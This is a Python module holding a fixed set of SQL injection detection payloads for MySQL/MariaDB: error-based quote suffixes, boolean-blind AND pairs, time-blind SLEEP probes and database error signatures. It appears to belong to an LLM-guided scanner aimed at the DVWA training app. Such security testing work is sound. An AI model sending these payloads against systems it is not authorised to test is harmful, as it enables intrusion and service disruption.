# -*- coding: utf-8 -*-
"""
CWE-89 payload set -- MySQL / MariaDB family.

IMPORTANT: design principle
   The payload list is **fixed**. The LLM does not generate it.
   The LLM only decides "what context is this parameter in",
   and the code fires the whole group matching that decision.
   -> Same decision means same requests, so results reproduce across runs.

Source: selected and adapted from the public lists in SQLmap / PayloadsAllTheThings.
Target: DVWA (MariaDB). MySQL syntax works as-is.
"""

from dataclasses import dataclass
from typing import Literal

Context = Literal["numeric", "string", "unknown"]
Technique = Literal["error-based", "boolean-blind", "time-blind"]


@dataclass(frozen=True)
class Payload:
    value: str
    technique: Technique
    context: str          # "any" for suffixes that fit every context
    note: str = ""


# ---------------------------------------------------------------------------
# 1. error-based -- pull out DB error messages. Cheapest and fastest, so always first.
# ---------------------------------------------------------------------------
# EVERY payload here is a SUFFIX. The prober appends it to the parameter's
# original value, so id=1 is sent as id=1' -- it never replaces the value.
# That is why there is no "1'" entry: appending it to 1 would send id=11'.
ERROR_BASED = [
    Payload("'",      "error-based", "any",  "break syntax with a single quote"),
    Payload('"',      "error-based", "any",  "double-quote context"),
    Payload("')",     "error-based", "any",  "wrapped in parentheses"),
    Payload("\\",     "error-based", "any",  "break backslash escaping"),
]

# ---------------------------------------------------------------------------
# 2. boolean-blind -- send a true/false pair and look at the response difference.
#    IMPORTANT: always send them as a pair. A single request cannot decide anything.
# ---------------------------------------------------------------------------
#    IMPORTANT: AND only, never OR. The decision rule is an asymmetry -- TRUE has
#    to match the baseline while FALSE differs. An OR-TRUE payload returns every
#    row in the table, so it differs from the baseline too, and a genuinely
#    vulnerable parameter gets scored "not vulnerable". OR belongs to
#    exploitation, not to detection.
BOOLEAN_BLIND_STRING = [
    ("' AND '1'='1",        "' AND '1'='2"),
]
BOOLEAN_BLIND_NUMERIC = [
    (" AND 1=1",            " AND 1=2"),
]

# ---------------------------------------------------------------------------
# 3. time-blind -- last resort. Slow and fragile against network latency.
#    IMPORTANT: always confirm with 2 reproductions. One delay is not evidence.
# ---------------------------------------------------------------------------
SLEEP_SECONDS = 5
# AND only, again. "OR SLEEP(5)" evaluates SLEEP once per row the query returns,
# so a five-row table answers after 25 seconds, not 5 -- which reads as a hang,
# blows the request timeout, and holds a DB connection the whole time.
TIME_BLIND_STRING = [
    Payload(f"' AND SLEEP({SLEEP_SECONDS})-- ",       "time-blind", "string"),
]
TIME_BLIND_NUMERIC = [
    Payload(f" AND SLEEP({SLEEP_SECONDS})-- ",        "time-blind", "numeric"),
]

# ---------------------------------------------------------------------------
# DB error fingerprints -- if one of these is in the response, error-based is confirmed.
# The decision rule lives in code. We do not ask the LLM "does this look like an error?".
# ---------------------------------------------------------------------------
ERROR_SIGNATURES = [
    "You have an error in your SQL syntax",
    "check the manual that corresponds to your MariaDB",
    "check the manual that corresponds to your MySQL",
    "mysql_fetch_array()",
    "mysqli_fetch",
    "supplied argument is not a valid MySQL",
    "Unknown column",
    "SQLSTATE[",
    "Warning: mysql",
]


def select(context: Context, stage: int) -> list:
    """
    Returns a **fixed group** based on the context the LLM judged and the current stage.

    stage 1: error-based        (cheap. always first)
    stage 2: boolean-blind pair (when stage 1 stayed silent)
    stage 3: time-blind         (last. slow)

    IMPORTANT: the same (context, stage) input always yields the same list.
      Because the LLM does not pick the list itself, reproducibility across runs is guaranteed.
    """
    if stage == 1:
        # Every error-based payload is a context-free suffix, so the whole group
        # goes out regardless of what the LLM judged.
        return list(ERROR_BASED)

    if stage == 2:
        return _ordered(BOOLEAN_BLIND_NUMERIC, BOOLEAN_BLIND_STRING, context)

    if stage == 3:
        return _ordered(TIME_BLIND_NUMERIC, TIME_BLIND_STRING, context)

    return []


def _ordered(numeric: list, string: list, context: Context) -> list:
    """Judged context decides the ORDER, never the membership.

    A numeric-looking value is not proof of a numeric context: DVWA at level low
    builds "WHERE user_id = '$id'", quoting a parameter whose value is 1. Betting
    the whole stage on the LLM's guess loses the blind SQLi page. So both groups
    always go out, with the judged one first -- the likely hit lands early and
    the run still stops at the first confirmation.

    Deterministic either way: the same context always produces the same sequence.
    """
    return (numeric + string) if context == "numeric" else (string + numeric)


def has_sql_error(body: str) -> str | None:
    """If a DB error fingerprint is present in the response body, return that fingerprint."""
    for sig in ERROR_SIGNATURES:
        if sig.lower() in body.lower():
            return sig
    return None


# Total count -- used in the talk when saying "SQLmap fires thousands vs our N"
# Requests, not entries: a boolean-blind pair costs two requests, and each
# time-blind payload is re-sent once to confirm reproduction.
TOTAL = (len(ERROR_BASED)
         + (len(BOOLEAN_BLIND_STRING) + len(BOOLEAN_BLIND_NUMERIC)) * 2
         + (len(TIME_BLIND_STRING) + len(TIME_BLIND_NUMERIC)) * 2)

if __name__ == "__main__":
    print(f"{TOTAL} payloads total (SQLmap fires thousands indiscriminately)")
    for ctx in ("numeric", "string"):
        for st in (1, 2, 3):
            print(f"  context={ctx:8s} stage={st} -> {len(select(ctx, st))}")
